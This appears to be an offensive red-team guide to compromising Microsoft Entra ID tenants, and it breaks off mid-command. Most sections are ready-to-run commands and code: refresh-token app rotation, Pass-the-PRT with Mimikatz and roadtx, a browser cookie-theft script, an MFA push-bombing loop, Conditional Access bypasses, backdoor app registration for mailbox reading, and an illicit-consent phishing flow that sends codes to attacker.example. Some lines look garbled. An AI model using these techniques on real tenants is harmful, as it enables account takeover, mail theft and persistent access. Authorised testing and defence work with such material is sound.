# Microsoft Entra ID Deep-Dive — Identity Provider Attack Guide

> Deep-dive companion to `skills/cloud-identity-attack/SKILL.md` and `guides/cloud-identity-attack-playbook.md`.
>
> Audience: red teamers, purple teamers, and security engineers who need to take a Microsoft Entra ID (formerly Azure AD) tenant from initial foothold to long-term persistence, with full coverage of the 2024 threat landscape including Primary Refresh Token (PRT) theft, Conditional Access bypass classes, app registration abuse, Administrative Unit attacks, and the high-profile incidents (SolarWinds SUNBURST, Nobelium, Midnight Blizzard).
>
> Scope: **Microsoft Entra ID only**. For Okta and Auth0 see `guides/cloud-identity-attack-okta-auth0-deep.md`. For federation compromise (AD FS, Ping) see the playbook §7. For AWS IAM Identity Center pivots see the playbook §9.3.

---

## 1. Entra ID Architecture Primer

You cannot attack what you do not understand. This section is the minimum architectural baseline for the rest of the guide.

### 1.1 Tenant, directory, and the dual control plane

An Entra ID **tenant** is a dedicated instance of Microsoft Entra ID that an organization receives when it signs up for a Microsoft cloud service (Microsoft 365, Azure, Intune, Dynamics 365). Each tenant is identified by a GUID (`tenantId`) and has one or more verified DNS domains (e.g., `corp.onmicrosoft.com` plus custom domains like `corp.com`).

Key architectural facts:

- The **directory** is the data store (users, groups, apps, service principals, devices, conditional access policies, role assignments). It is logically a single, globally-replicated graph database.
- The **control plane** is exposed via two surfaces:
  - **Microsoft Graph API** (`https://graph.microsoft.com/v1.0/` and `/beta/`) — the modern unified API surface.
  - **Azure Resource Manager** (`https://management.azure.com/`) — Azure subscriptions, but identity enumeration still goes via Graph.
- The **authentication authority** is `https://login.microsoftonline.com/<tenantId>` (global) or regional equivalents like `login.microsoftonline.us` (US Gov), `login.chinacloudapi.cn` (China).

The tenant's GUID is recoverable from any verified domain:

```bash
# Recover tenant GUID from a verified domain name
curl -s "https://login.microsoftonline.com/corp.com/.well-known/openid-configuration" \
  | jq '.issuer'
# Issuer URL contains the GUID, e.g.:
# https://sts.windows.net/REPLACE_WITH_YOUR_TENANT_ID/
```

### 1.2 Hybrid identity: AADConnect and the three auth models

Most enterprises have on-premises Active Directory (AD DS) AND Entra ID. **AADConnect** (now **Microsoft Entra Connect**) synchronizes identity between them. The authentication model determines how on-prem passwords are validated at cloud sign-in:

| Model | How it works | Attack surface |
|-------|--------------|----------------|
| **Password Hash Sync (PHS)** | AADConnect extracts on-prem password hashes (UMD4 of UTF-16 password), re-hashes them, and synchronizes them to Entra ID. Cloud sign-ins validate the hash locally in Entra ID. | The AADConnect server holds an account `MSOL_<hex>` (now `On-Premises Directory Synchronization Account`) in on-prem AD with **DCSync-equivalent** privileges. Compromise this account → DCSync → full on-prem domain compromise. |
| **Pass-Through Authentication (PTA)** | Cloud sign-ins send the password to the on-prem PTA agent over an outbound channel. The agent validates against on-prem AD. | A PTA agent running on a server holds authentication requests in memory. Compromise the PTA agent host → intercept plaintext passwords as they pass through (CVE-2024-21320-style interception). Microsoft disclosed a PTA backdoor risk: a rogue agent can authenticate ANY user (backdoor auth). |
| **Federated (AD FS, Okta, Ping)** | Cloud sign-ins for federated domains redirect to the IdP. IdP validates credentials and issues a SAML token. Entra ID consumes the SAML token. | The **token-signing certificate** of the IdP is the long-lived secret. Compromise the cert → forge SAML as any user → **Golden SAML** (covered in playbook §9). |

Enumerate the model via realm discovery:

```bash
# Realm discovery
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=victim@corp.com&xml=1"
# Look for:
#   NameSpaceType="Managed"    → PHS or PTA (Entra ID validates)
#   NameSpaceType="Federated"  → federated with AD FS / Okta / Ping
#   AuthURL=...                → the IdP URL the user is redirected to
```

The distinction matters because:

- For **Managed** tenants, password attacks target Entra ID directly (password spray, MFA fatigue, OAuth phishing).
- For **Federated** tenants, password attacks target the on-prem IdP (often no lockout policy, no MFA on the redirect endpoint), then the SAML token is consumed by Entra ID.

### 1.3 The Primary Refresh Token (PRT)

A PRT is a master token issued to a **registered device** upon user sign-in. It is valid for **up to 90 days** (continuous use refreshes it), and it can be exchanged for access tokens to **any** Microsoft first-party app — Graph, Outlook, Azure RM, Teams, SharePoint. This is the cloud equivalent of the on-prem TGT, and "Pass-the-PRT" is the cloud equivalent of Pass-the-Ticket.

A PRT is bound to:
- A device (the device's TPM or software key)
- A user (the user who signed in)
- A session key (transport key, negotiated at PRT issuance)

The PRT is **not** a bearer token on its own. To use it, an attacker must also recover (or forge) the session key. ROADtools' `roadtx` handles this end-to-end.

### 1.4 Roles: Global Admin and the privileged tier

Entra ID has ~110 built-in directory roles. The top tier:

| Role | Role template ID | Privileges |
|------|-------------------|------------|
| **Global Administrator** (formerly Company Administrator) | `62e90394-69f5-4237-9190-012177145e10` | All admin tasks in Entra ID. Can elevate to Azure subscription Owner via "Elevate Access" (legacy mechanism). |
| **Privileged Role Administrator** | `e8611ab8-c189-469a-8605-bc67d0bc18b4` | Manage role assignments including Global Admin — equivalent to Global Admin in practice. |
| **Application Administrator** | `9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3` | Create and manage app registrations and service principals. Can add credentials to any app → escalate via app roles. |
| **User Administrator** | `fe930be7-5e62-47db-91af-98c3a49a38b1` | Reset any non-privileged user's password; create users; manage groups (incl. group-based role assignments). |
| **Cloud Application Administrator** | `158c047a-c907-4556-b7ef-446552a98488` | Like Application Admin but excludes app proxy. |
| **Exchange Administrator**, **SharePoint Administrator**, **Teams Administrator** | various | Full control of the respective workload. |

The Microsoft documentation page **"Microsoft Entra built-in roles"** is the authoritative reference. A few role quirks worth memorizing:

- **Application Admin can add credentials to any app and sign in as that app** — this is a documented escalation path: Application Admin → create credentials on a privileged SP → authenticate as SP.
- **User Administrator can reset the password of any non-admin**, then add the user to a group that has a role assignment. Group-based role assignments convert User Admin into Global Admin indirectly.
- **Intune Administrator** can push scripts to any managed device → SYSTEM on every Windows endpoint.
- **Global Admin can elevate to Azure subscription Owner**: portal → Azure AD → Properties → "Access management for Azure resources" → toggle "Yes". This grants Owner on the root management group `/` for every subscription linked to the tenant.

### 1.5 Administrative Units (AUs)

AUs are scoped administrative units: a User Administrator assigned to an AU can only manage users in that AU. The intended design is delegation. The attack surface:

- An AU-scoped admin can create users *within* their AU.
- If a role assignment (e.g., Global Admin) is mistakenly placed at the tenant level (not the AU level), the AU-scoped admin can add their newly-created AU user to that role via the **directory-level** role assignment API — depending on the role's allowed scope.
- More importantly: AU membership is itself a discovery surface. An attacker who can read an AU's membership knows exactly which users admins consider sensitive.

### 1.6 B2B and B2C

- **B2B (Business-to-Business)**: a guest user from one tenant is invited to another tenant. The guest's UPN is rewritten: `victim@othercorp.com` becomes `victim_othercorp.com#EXT#@corponmicrosoft.com`. B2B guests are a major persistence vector (covered in §10).
- **B2C (Business-to-Consumer)**: a separate Entra ID tenant that lets end users sign in with social accounts (Google, Facebook) or email/password. The B2C tenant is distinct from the workforce tenant and has its own policies and apps.

---

## 2. Recon Tooling Reference

The Microsoft identity attack ecosystem has converged on a stable set of tools. Memorize these.

| Tool | Author / Maintainer | Primary use | Key command |
|------|---------------------|-------------|-------------|
| **ROADtools** (`roadrecon`, `roadtx`, `roadlib`) | Dirk-jan Mollema (@_dirkjan) | AAD recon (roadrecon), token/PRT abuse (roadtx) | `python roadrecon auth --device-code` |
| **AADInternals** | Nestori Syynimaa (@DrAzureAD) | Federation, mailbox, MFA, PRT — PowerShell Swiss-army knife | `Get-AADIntTenantDomains` |
| **AzureHound** | BloodHoundAD team | BloodHound ingestor for AAD graph attack paths | `azurehound -j $JWT list users` |
| **MicroBurst** | NetSPI | Subdomain enum, blob hunting, password sprays | `Invoke-EnumerateAzureSubDomains` |
| **MFASweep** | dafthack | MFA enforcement gap detection across MS services | `Invoke-MFASweep -Username u -Password p` |
| **TokenTactics** (and TokenTacticsV2) | FireEye/Mandiant, then community | OAuth device code phishing per Microsoft first-party app | `Get-GraphTokenWithDeviceCode` |
| **GraphRunner** | dafthack | Microsoft 365 / Graph post-exploitation | `Get-GraphTokens` |
| **o365creeper / MailSniper** | various | Email address enumeration, EXO enum | `Invoke-ASMiMisc` |
| **AzureAD / MSOnline PowerShell** | Microsoft (deprecated 2024+) | Legacy enumeration | `Connect-AzureAD` |
| **Microsoft Graph PowerShell SDK** | Microsoft | Modern enumeration | `Connect-MgGraph -Scopes "User.Read.All"` |
| **Stormspotter** | Azure (now arch) | AAD attack graph (predecessor to AzureHound) | Stormspotter | Python API + Web UI |
| **AADSpy / TeamFiltration** | community | OAuth-aware password sprays + exfil | `teamfiltration --oauth` |

### 2.1 Tool selection decision tree

```
What do you have?
│
├── Unauthenticated external position
│   └── AADInternals (Get-AADIntTenantDomains) + MicroBurst (Invoke-EnumerateAzureSubDomains)
│       + manual OpenID discovery (curl)
│
├── Valid low-priv user creds
│   └── ROADtools (roadrecon auth + roadrecon gather) — most comprehensive
│       Microsoft Graph PowerShell (Connect-MgGraph) for targeted queries
│       AzureHound (build attack graph for BloodHound)
│
├── Stolen refresh token
│   └── ROADtools (roadtx) for cross-app token exchange
│       GraphRunner (Get-GraphTokens) for M365 post-exploitation
│
├── Stolen PRT (or compromised Azure AD-joined device)
│   └── ROADtools (roadtx prt) for PRT abuse
│       AADInternals (Get-AADIntUserPRT) for PRT extraction
│
├── Federated target (AD FS)
│   └── AADInternals (New-AADIntSAMLToken) for Golden SAML
│       ADFSDump / ADFSDump-LL (Mandiant) for cert extraction
│
└── Microsoft 365 data access (mail, files, teams)
    └── GraphRunner (broad M365 coverage)
        TokenTactics (per-app token acquisition)
```

### 2.2 OpenID Connect discovery (the universal starting point)

```bash
# The OIDC discovery document works for almost every modern IdP, including Entra ID
# Always start here to confirm tenant existence and learn endpoints
TENANT_DOMAIN="corp.com"
curl -s "https://login.microsoftonline.com/${TENANT_DOMAIN}/.well-known/openid-configuration" \
  | jq '{issuer, authorization_endpoint, token_endpoint, device_authorization_endpoint, end_session_endpoint, jwks_uri}'
# Sample output:
# {
#   "issuer": "https://sts.windows.net/REPLACE_WITH_YOUR_TENANT_ID/",
#   "authorization_endpoint": "https://login.microsoftonline.com/REPLACE_WITH_YOUR_TENANT_ID/oauth2/v2.0/authorize",
#   "token_endpoint": "https://login.microsoftonline.com/REPLACE_WITH_YOUR_TENANT_ID/oauth2/v2.0/token",
#   "device_authorization_endpoint": "https://login.microsoftonline.com/REPLACE_WITH_YOUR_TENANT_ID/oauth2/v2.0/devicecode",
#   ...
# }
```

### 2.3 Tenant GUID recovery

```bash
# Method 1: from the OIDC issuer URL
curl -s "https://login.microsoftonline.com/corp.com/.well-known/openid-configuration" \
  | jq -r '.issuer' | grep -oP '[0-9a-f-]{36}'

# Method 2: from a user realm lookup
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=victim@corp.com&xml=1" \
  | grep -oP 'Token="[0-9a-f-]{36}"'

# Method 3: from AADInternals
Import-Module AADInternals
Get-AADIntTenantDomains -Domain corp.com
```

---

## 3. Authentication Abuse

### 3.1 Refresh token fundamentals

A refresh token (RT) is the long-lived credential issued alongside a short-lived access token. In Entra ID, a single RT with `offline_access` scope can be exchanged for access tokens scoped to almost any Microsoft first-party app — without prompting the user again. This is the **single most powerful credential in the Microsoft identity ecosystem**.

The exchange is the OAuth 2.0 refresh token grant:

```http
POST /common/oauth2/v2.0/token HTTP/1.1
Host: login.microsoftonline.com
Content-Type: application/x-www-form-urlencoded

client_id=1950a258-227b-4e31-a9cf-717495945fc2
&grant_type=refresh_token
&refresh_token=REPLACE_WITH_YOUR_REFRESH_TOKEN
&scope=https://graph.microsoft.com/.default offline_access
```

The trick: **change the `client_id` and `scope` and you get a different audience**. The Microsoft 1950a258-... client (Microsoft Graph PowerShell) gives Graph scopes; d3590ed6-... (Microsoft Office) gives Outlook; 04b07795-... (Azure CLI) gives Azure RM; 1fec8e78-... (Microsoft Teams) gives Teams. A single RT becomes a master key.

```bash
# Reference: Microsoft first-party client IDs that accept RT exchange
# 1950a258-227b-4e31-a9cf-717495945fc2  Microsoft Graph PowerShell
# d3590ed6-52b3-4102-aeff-aad2292ab01c  Microsoft Office
# 04b07795-8ddb-461a-bbee-02f9e1bf7b46  Azure CLI
# 1fec8e78-bce4-4aaf-ab1b-5451cc387264  Microsoft Teams
# 872cd9fa-d31f-45e0-9eab-6e460a02d1f1  Visual Studio Code
# 04b07795-aad2292ab01c-1fec8e78        (some third-party integrations)

# Exchange an RT for a Microsoft Graph access token
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=1950a258-227b-4e31-a9cf-717495945fc2" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$REFRESH_TOKEN" \
  -d "scope=https://graph.microsoft.com/.default offline_access" \
  | jq -r '.access_token'
```

The TokenTactics project automated this "app rotation" pattern for device-code-acquired tokens. roadtx (`roadtx refill` and `roadtx prtauth`) does the same for token/PRT workflows.

### 3.2 Pass-the-PRT

Pass-the-PRT is the cloud equivalent of Pass-the-Ticket. With a stolen PRT (and its session key), an attacker can request access tokens for any cloud app as the affected user — including users with MFA, conditional access, and device compliance requirements, because the PRT already encodes all of those.

**PRT acquisition (4 main sources)**:

1. **Endpoint compromise with admin rights**: dump the PRT from the local device. AADInternals and roadtx provide extractors.
2. **Mimikatz 2.0+ `cloudap` module**: extracts PRT + session key from LSASS on a hybrid-joined device.
3. **ROADtools `roadtx` on compromised Windows device**: dumps PRT non-destructively.
4. **Pagefile / hibernation**: PRT artifacts persist on disk in some configurations.

```powershell
# Method 1: AADInternals (as admin on the device)
Import-Module AADInternals
Get-AADIntUserPRT
# Returns PRT (base64) + session key + user UPN + device ID
```

```bash
# Method 2: Mimikatz (cloudap module)
mimikatz # privilege::debug
mimikatz # sekurlsa::cloudap
# Output contains Primary Refresh Token for each logged-in user
# Extract the PRT and the ProofOfPossessionKey (session key / transport key)
```

```bash
# Method 3: roadtx — full Pass-the-PRT workflow
# Step 1: extract PRT from the device
python3 roadtx.py prtauth --prt-extract-roadtools
# Step 2: request a token using the PRT
python3 roadtx.py prtauth --prt '<prt-base64>' \
  --prt-sessionkey '<session-key-hex>' \
  --resource 'https://graph.microsoft.com' \
  --client-id '1950a258-227b-4e31-a9cf-717495945fc2'
# Output: a Graph access token usable as the user, including across MFA and CA
```

**Defender-side**: PRT replay is detectable via anomalous device ID / IP / user agent combinations. Entra ID sign-in logs include the device ID — alerts on PRT-based sign-ins from a new IP or "unfamiliar device + familiar user" pattern.

### 3.3 Pass-the-Cookie

Many Microsoft cloud apps rely on browser cookies for SSO. The most valuable cookies are:

- **`ESTSAUTH`** — the Entra ID session cookie. Issued after successful authentication. Long-lived (default 24h, can be persistent for "stay signed in"). Replayable across browsers if the session is still valid.
- **`ESTSAUTHPERSISTENT`** — persistent variant, valid for up to 90 days with "remember me".
- **`SignInStateCookie`** — auxiliary cookie.
- **M365-specific cookies**: `rtFa` (refresh token for SharePoint/OneDrive), `rtFaO365` (Exchange Online), etc.

```python
# Pseudo-Python: cookie theft from a compromised browser profile
import sqlite3, shutil, os, json

# Chrome-based browsers store cookies in an SQLite DB
chrome_cookie_path = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Cookies')
shutil.copy(chrome_cookie_path, '/tmp/cookies_copy.db')

conn = sqlite3.connect('/tmp/cookies_copy.db')
cursor = conn.cursor()
cursor.execute("""
    SELECT host_key, name, encrypted_value
    FROM cookies
    WHERE host_key LIKE '%.microsoftonline.com'
       OR host_key LIKE '%.office.com'
       OR host_key LIKE '%.office365.com'
""")
for host, name, enc_value in cursor.fetchall():
    # Decrypt with Chrome Safe Storage key (OS keychain on macOS, DPAPI on Windows)
    # Then replay the cookie in your own HTTP client
    print(host, name, decrypt(enc_value))
```

```bash
# Use the recovered cookies in curl
curl -s -H "Cookie: ESTSAUTH=REPLACE_WITH_YOUR_ESTSAUTH_COOKIE; SignInStateCookie=..." \
  "https://outlook.office.com/owa/"
# 200 with the user's mailbox: cookie replay successful
```

**Note**: Entra ID has rolled out Continuous Access Evaluation (CAE) which shortens the cookie validity window significantly for high-value apps. Replay windows are now minutes-to-hours, not days. But CAE is only enforced for CAE-aware apps (Graph, Outlook, SharePoint, Teams, Azure).

### 3.4 Token replay across cloud apps

An access token is bound to an `aud` (audience) claim. A Graph token cannot be replayed against Outlook directly — the audience is checked. However:

- **The same RT works for many audiences** (see §3.1).
- **Cross-service token exchange**: Some Microsoft services accept token exchange via the `/token` endpoint with a special scope. For example, a Microsoft Graph token can sometimes be exchanged for an Outlook token via the Microsoft Identity Platform's token exchange mechanism.
- **Microsoft Exchange Web Services (EWS) impersonation**: a service principal with `full_access_as_app` app role can read any mailbox in the tenant — no per-user token needed.

```bash
# Token exchange: use a Graph RT to get an Outlook access token
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$REFRESH_TOKEN" \
  -d "scope=https://outlook.office.com/.default offline_access"
# The returned access token has aud=outlook.office.com — usable for mail
```

---

## 4. Conditional Access Bypass Techniques

Conditional Access (CA) is the Entra ID policy layer. A CA policy defines: **who** (users, groups, roles), **doing what** (apps, actions), **from where** (locations, IP ranges, device state, sign-in risk), **must satisfy** (MFA, compliant device, password change, terms of use). Bypass classes target each of these dimensions.

### 4.1 Identify the policy landscape

```bash
# List all CA policies (requires CA Admin or Global Admin)
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \
  | jq '.value[] | {
      displayName,
      state,
      included_users: .conditions.users.includeUsers,
      excluded_users: .conditions.users.excludeUsers,
      included_apps: .conditions.applications.includeApplications,
      excluded_apps: .conditions.applications.excludeApplications,
      included_locations: .conditions.locations.includeLocations,
      grant_controls: .grantControls
    }'
```

Look for:
- **State = `enabledForReportingButNotEnforced`** — policy is in "report only" mode; bypass is trivial.
- **`excludeApplications` non-empty** — apps in this list bypass the policy. The classic case is Exchange Online SMTP for legacy apps.
- **`excludeUsers` non-empty** — emergency / break-glass accounts. Their UPN is gold.
- **`excludeRoles` non-empty** — roles exempted from the policy.
- **`includePlatforms: all` / `excludePlatforms: ...`** — platforms excluded from device requirements (often macOS, Linux).
- **Grant controls: `block`** — a block policy (don't try to bypass, work around).

### 4.2 Bypass class A: Legacy authentication

Legacy auth = basic auth, no modern OAuth. POP3, IMAP, SMTP-AUTH, Exchange ActiveSync (EAS), EWS, Autodiscover, MAPI over HTTP. Microsoft disabled basic auth for Exchange Online protocols in October 2022 — but **only for tenants without exceptions**, and many tenants have per-protocol overrides for legacy apps.

```powershell
# MFASweep — checks each MS service for MFA enforcement gap
Import-Module MFASweep
Invoke-MFASweep -Username "victim@corp.com" -Password "P@ssw0rd"
# Output per service: AOWS, EWS, IMAP, POP, SMTP, EAS — which require MFA, which don't
```

```bash
# Manual test: IMAP login (if successful, legacy auth still works for IMAP)
swaks --to victim@corp.com --server outlook.office365.com:993 \
  --auth LOGIN --auth-user victim@corp.com --auth-password 'P@ssw0rd' \
  -tls --port 993

# Manual test: EWS auth
curl -s -X POST "https://outlook.office365.com/EWS/Exchange.asmx" \
  -u "victim@corp.com:P@ssw0rd" \
  -H "Content-Type: text/xml" \
  --data-binary @ews_request.xml
```

**Mitigation**: Block legacy auth at the tenant level via CA policy "Block legacy authentication".

### 4.3 Bypass class B: Device compliance spoofing

A CA policy requiring "compliant device" checks the device state Entra ID has on record. An attacker who can register a fake device or clone a real device's certificate can satisfy this requirement.

```bash
# Register a fake device (requires the user to be allowed to register devices,
# which is often the case by default)
# roadtx handles device registration end-to-end
python3 roadtx.py device --dump
# Output: device certificate, device ID, and join type

# With the fake device registered, request a PRT for that device
python3 roadtx.py prtauth --device-cert device.pem --device-key device.key \
  --username 'attacker@corp.com' --password 'P@ssw0rd'
```

For device cloning (the more interesting attack), an attacker with code execution on a target device can extract the device certificate + private key + the device's session state. ROADtools `roadtx` and AADInternals both provide extractors. The cloned device can then authenticate from anywhere, satisfying "compliant device" CA.

### 4.4 Bypass class C: App-level policy gaps (excluded apps)

CA policies often exclude specific apps. Two scenarios:

1. **First-party excluded app**: e.g., a CA policy requires MFA for "All cloud apps" but excludes Microsoft Admin Management (because admins need to manage policies without MFA in some break-glass designs). Authenticate via the excluded app's client ID → bypass MFA.

2. **Third-party excluded app**: a SaaS app integrated via SSO is excluded. Compromise creds for that app, sign in, get an Entra ID session, then traverse to other apps via the myapps portal.

```bash
# Enumerate excluded apps across all policies
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \
  | jq -r '.value[].conditions.applications.excludeApplications[]?' \
  | sort -u

# Translate app IDs to names
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appId eq 'REPLACE_WITH_YOUR_APP_ID'" \
  | jq '.value[].displayName'
```

### 4.5 Bypass class D: Excluded users (break-glass accounts)

A CA policy excluding specific UPNs creates a target. The break-glass account is documented in the policy itself. Enumerate → compromise that specific account → bypass.

```bash
# Enumerate excluded users
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \
  | jq -r '.value[].conditions.users.excludeUsers[]?' \
  | sort -u
# Note: if the value is "GuestsOrExternalUsers", that's a built-in selector, not a UPN
```

### 4.6 Bypass class E: Location-based policy with routeable trust

CA policies keyed off "trusted location" (a named IP range) treat requests from those IPs as low-risk. An attacker with a foothold in the trusted location (corporate VPN, cloud relay) bypasses the policy.

Common trust-spoofing infrastructure:

- **Apple iCloud Private Relay** — routes traffic through Apple's egress IPs, sometimes classified as "trusted" by some tenants' allowlists.
- **Residential proxies** (Bright Data, Soax, IPRoyal) — exit IPs from real ISPs in target geographies.
- **Cloud VM in trusted cloud region** — if "trusted location" = "all Azure IPs", a cheap Azure VM is sufficient.
- **DNS-based trusted location confusion** — Microsoft added "trusted Microsoft IPs" which include their egress ranges; some tenants over-trust.

```bash
# Route via residential proxy
export HTTPS_PROXY="http://user:pass@residential.proxy.example:22225"
az login --use-device-code -u victim@corp.com -p 'P@ssw0rd'
# If the residential IP is in a "trusted location", CA may not require MFA
```

### 4.7 Bypass class F: MFA fatigue (push-bombing)

For tenants without number-matching in Microsoft Authenticator (default since May 2023 but lag in older tenants), MFA fatigue is the easiest bypass. Send dozens of push prompts until the user approves (or accidentally approves).

```bash
# Trigger MFA prompts by initiating a sign-in that requires MFA
# This is most effective via the Microsoft SignIn API directly
for i in $(seq 1 50); do
  curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
    -H "Content-Type: application/json" \
    -d '{"username":"victim@corp.com","isOtherIdpSupported":true,"checkPhones":false,"isRemoteNGCSupported":true,"isCookieBannerShown":false,"isFidoSupported":false}' \
    > /dev/null
  # Initiate the actual sign-in that triggers MFA push
  curl - -X POST "https://login.microsoftonline.com/common/SAS/ProcessAuth" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data "login=victim@corp.com&passwd=WRONG_PASSWORD" > /dev/null
  sleep 2
done
```

**Mitigation**: number-matching (default in MS Authenticator since 2023), phishing-resistant MFA (FIDO2), and rate-limiting MFA prompts server-side.

### 4.8 Bypass class G: Service principal auth

CA policies apply to **users**, not **service principals**. A client_credentials flow using an app secret/certificate bypasses user-targeted CA entirely. This is by design — apps don't have MFA. The attack: compromise an app registration's credentials, authenticate as the SP, access Graph/Outlook/Azure RM without user context.

```bash
# Service principal auth (no user, no MFA, often no CA)
curl -s -X POST "https://login.microsoftonline.com/<tenantId>/oauth2/v2.0/token" \
  -d "client_id=REPLACE_WITH_YOUR_CLIENT_ID" \
  -d "client_secret=REPLACE_WITH_YOUR_CLIENT_SECRET" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=client_credentials"
```

---

## 5. App Registration / Service Principal Abuse

App registrations and their service principals are the new service accounts. Each app has an identity, an access policy, and appRole assignments. Over-privileged apps are the highest-blast-radius attack surface in Entra ID.

### 5.1 Terminology

- **Application object** (in the developing tenant): the app definition — name, redirect URIs, requested app roles, secrets, certificates.
- **Service principal** (in the consuming tenant): the instantiated identity used at runtime. Has `appId` matching the application object.
- **App role**: a permission defined on the app. `Mail.Read`, `Application.ReadWrite.All`, `RoleManagement.ReadWrite.Directory` are all app roles on the Microsoft Graph service principal.
- **`oauth2PermissionScopes`**: delegated permissions (user-context) the app can request.
- **`requiredResourceAccess`**: the static declaration of permissions the app needs.
- **App consent**: a user (or admin) grants the app the right to use a scope on their behalf (delegated) or for the whole tenant (app-only).

### 5.2 Hidden app creation for persistence

An attacker with Application Administrator (or Global Admin) can create a backdoor app that persists indefinitely:

```bash
# 1. Create the app (requires Application Admin or Global Admin)
az rest --method post \
  --url "https://graph.microsoft.com/v1.0/applications" \
  --body '{
    "displayName": "Contoso-Compliance-Audit",
    "requiredResourceAccess": [{
      "resourceAppId": "00000003-0000-0000-c000-000000000000",
      "resourceAccess": [
        {"id": "024d486e-b451-40bb-833d-3e28d5d60bb0", "type": "Scope"},
        {"id": "e1fe6dd8-ba31-4d61-89e7-88639da4683d", "type": "Scope"}
      ]
    }]
  }'
# 00000003-... = Microsoft Graph
# 024d486e-... = Mail.Read (delegated)
# e1fe6dd8-... = User.Read (delegated)

# 2. Create the service principal
az rest --method post \
  --url "https://graph.microsoft.com/v1.0/servicePrincipals" \
  --body '{"appId": "REPLACE_WITH_YOUR_CLIENT_ID"}'

# 3. Add app-only permissions (requires admin consent)
az rest --method post \
  --url "https://graph.microsoft.com/v1.0/oauth2PermissionGrants" \
  --body '{
    "clientId": "REPLACE_WITH_YOUR_SP_ID",
    "consentType": "AllPrincipals",
    "resourceId": "REPLACE_WITH_YOUR_GRAPH_SP_ID",
    "scope": "Mail.Read User.Read.All"
  }'

# 4. Add a secret or certificate to authenticate as the app
az rest --method post \
  --url "https://graph.microsoft.com/v1.0/applications/REPLACE_WITH_YOUR_APP_OBJ_ID/addPassword" \
  --body '{"passwordCredential":{"displayName":"backup-sync-secret"}}'
# Returns: clientId, secretText (save this), hint

# 5. Now authenticate as the app and read all mail
curl -s -X POST "https://login.microsoftonline.com/REPLACE_WITH_YOUR_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=REPLACE_WITH_YOUR_CLIENT_ID" \
  -d "client_secret=REPLACE_WITH_YOUR_CLIENT_SECRET" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=client_credentials" \
  | jq -r '.access_token' > /tmp/app_token

# Read any user's mail (Mail.Read with app-only auth)
curl -s -H "Authorization: Bearer $(cat /tmp/app_token)" \
  "https://graph.microsoft.com/v1.0/users/victim@corp.com/messages?\$top=10"
```

### 5.3 App-only permission grants (the persistence pattern)

The pattern is identical to §5.2 but for **application permissions** (app-only) instead of delegated. The relevant permissions on Microsoft Graph:

- `Mail.Read` (app-only: read every mailbox in the tenant)
- `Mail.ReadWrite` (app-only: read+write every mailbox)
- `Files.Read.All` (read every OneDrive/SharePoint file)
- `User.Read.All` (read every user profile)
- `Application.ReadWrite.All` (create/modify any app → create more backdoors)
- `RoleManagement.ReadWrite.Directory` (assign any directory role to any principal → escalate to Global Admin)
- `AppRoleAssignment.ReadWrite.All` (assign any app role → grant self any permission)

### 5.4 Microsoft Graph API enumeration

Once you have any token (delegated or app-only), enumerate aggressively:

```bash
# All applications in the tenant (the definition side)
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/applications?\$select=displayName,appId,requiredResourceAccess,passwordCredentials,keyCredentials" \
  | jq '.value[] | {
      displayName,
      appId,
      has_secret: (.passwordCredentials | length > 0),
      has_cert: (.keyCredentials | length > 0),
      perms: .requiredResourceAccess
    }'

# All service principals (the runtime identity side)
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/servicePrincipals?\$select=displayName,appId,appRoles,oauth2PermissionScopes"

# All oauth2 permission grants (who can do what as whom)
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/oauth2PermissionGrants" \
  | jq '.value[] | {clientId, consentType, resourceId, scope, principalId}'

# All app role assignments (app-only perms granted to service principals)
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/servicePrincipals/REPLACE_WITH_YOUR_SP_ID/appRoleAssignments" \
  | jq '.value[] | {appRoleId, resourceId, principalDisplayName}'

# Translate appRoleId to permission name
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appId eq '00000003-0000-0000-c000-000000000000'" \
  | jq '.value[0].appRoles[] | {id, value, displayName}'
```

### 5.5 Cross-tenant app consent (illicit consent grant)

An attacker-controlled app in tenant A can be consented by a victim user in tenant B. The victim's data in tenant B is then accessible from tenant A.

```bash
# Step 1: attacker registers an app in their tenant (tenant A)
# Redirect URI: https://attacker.example/callback
# Requested: Mail.Read, User.Read, offline_access

# Step 2: construct the consent URL for the victim's tenant (tenant B)
CONSENT_URL="https://login.microsoftonline.com/organizations/v2.0/adminconsent"
ATTACKER_CLIENT_ID="REPLACE_WITH_YOUR_ATTACKER_CLIENT_ID"
REDIRECT_URI="https://attacker.example/callback"
SCOPES="https://graph.microsoft.com/Mail.Read offline_access"

FULL_URL="${CONSENT_URL}?client_id=${ATTACKER_CLIENT_ID}&scope=${SCOPES}&redirect_uri=${REDIRECT_URI}"

# Step 3: phish the victim (in tenant B) to visit the URL and consent
# Step 4: capture the auth code at the redirect URI
# Step 5: exchange the auth code for tokens at tenant B's authority
curl -s -X POST "https://login.microsoftonline.com/REPLACE_WITH_YOUR_VICTIM_TENANT/oauth2/v2.0/token" \
  -d "client_id=${ATTACKER_CLIENT_ID}" \
  -d "scope=https://graph.microsoft.com/Mail.Read offline_access" \
  -d "code=REPLACE_WITH_YOUR_AUTH_CODE" \
  -d "redirect_uri=${REDIRECT_URI}" \
  -d "grant_type=authorization_code"

# Step 6: use the tokens to read the victim's mail
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
